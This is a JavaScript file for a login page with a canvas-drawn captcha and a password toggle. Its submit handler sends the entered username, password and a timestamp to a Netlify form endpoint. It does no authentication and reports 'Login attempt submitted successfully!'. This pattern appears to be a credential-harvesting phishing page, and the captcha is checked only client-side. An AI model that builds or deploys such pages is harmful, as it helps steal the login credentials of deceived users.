// Global variable to store the current captcha text
let currentCaptcha = '';

// Function to generate random captcha text
function generateCaptchaText() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    let captcha = '';
    for (let i = 0; i < 6; i++) {
        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return captcha;
}

// Function to draw captcha on canvas
function drawCaptcha() {
    const canvas = document.getElementById('captchaCanvas');
    const ctx = canvas.getContext('2d');
    
    // Clear canvas
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    
    // Generate new captcha text
    currentCaptcha = generateCaptchaText();
    
    // Set background
    ctx.fillStyle = '#f0f0f0';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // Add noise lines
    for (let i = 0; i < 5; i++) {
        ctx.strokeStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.3)`;
        ctx.beginPath();
        ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
        ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
        ctx.stroke();
    }
    
    // Add noise dots
    for (let i = 0; i < 30; i++) {
        ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.5)`;
        ctx.beginPath();
        ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 1, 0, 2 * Math.PI);
        ctx.fill();
    }
    
    // Draw captcha text
    ctx.font = 'bold 30px Arial';
    ctx.fillStyle = '#333';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    
    // Add slight rotation and position variation to each character
    const textWidth = ctx.measureText(currentCaptcha).width;
    const startX = (canvas.width - textWidth) / 2;
    
    for (let i = 0; i < currentCaptcha.length; i++) {
        ctx.save();
        const char = currentCaptcha[i];
        const charWidth = ctx.measureText(char).width;
        const x = startX + (textWidth / currentCaptcha.length) * i + (charWidth / 2);
        const y = canvas.height / 2 + (Math.random() * 10 - 5); // Random vertical position
        
        // Random rotation between -15 and 15 degrees
        const rotation = (Math.random() * 30) - 15;
        ctx.translate(x, y);
        ctx.rotate(rotation * Math.PI / 180);
        
        // Random color for each character
        ctx.fillStyle = `rgb(${Math.floor(Math.random() * 100)}, ${Math.floor(Math.random() * 100)}, ${Math.floor(Math.random() * 100)})`;
        
        ctx.fillText(char, 0, 0);
        ctx.restore();
    }
}

// Password toggle functionality
const togglePassword = document.getElementById('togglePassword');
const passwordInput = document.getElementById('password');

togglePassword.addEventListener('click', function() {
    // Toggle the type attribute
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    
    // Toggle the eye icon
    this.classList.toggle('fa-eye');
    this.classList.toggle('fa-eye-slash');
});

// Captcha refresh functionality
const refreshCaptcha = document.getElementById('refreshCaptcha');

refreshCaptcha.addEventListener('click', function() {
    drawCaptcha();
    // Clear the captcha input when refreshing
    document.getElementById('captchaInput').value = '';
});

// Form submission handler with Netlify
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const captchaInput = document.getElementById('captchaInput').value;
    const keepSigned = document.getElementById('keepSigned').checked;
    
    // Validate captcha
    if (captchaInput.toLowerCase() !== currentCaptcha.toLowerCase()) {
        alert('Incorrect captcha. Please try again.');
        drawCaptcha(); // Refresh captcha
        document.getElementById('captchaInput').value = ''; // Clear input
        return;
    }
    
    // Set timestamp
    const timestamp = new Date().toLocaleString();
    document.getElementById('timestamp').value = timestamp;
    
    // Create form data for Netlify submission
    const formData = new FormData(this);
    
    // Submit form using fetch (AJAX)
    fetch('/', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            alert('Login attempt submitted successfully!');
            // Reset form and captcha after submission
            this.reset();
            drawCaptcha();
        } else {
            throw new Error('Form submission failed');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error submitting form. Please try again.');
    });
});

// Footer link handlers
document.querySelectorAll('.footer-links a').forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        alert(this.textContent + ' functionality would be implemented here');
    });
});

// Initialize captcha on page load
window.addEventListener('load', function() {
    drawCaptcha();
});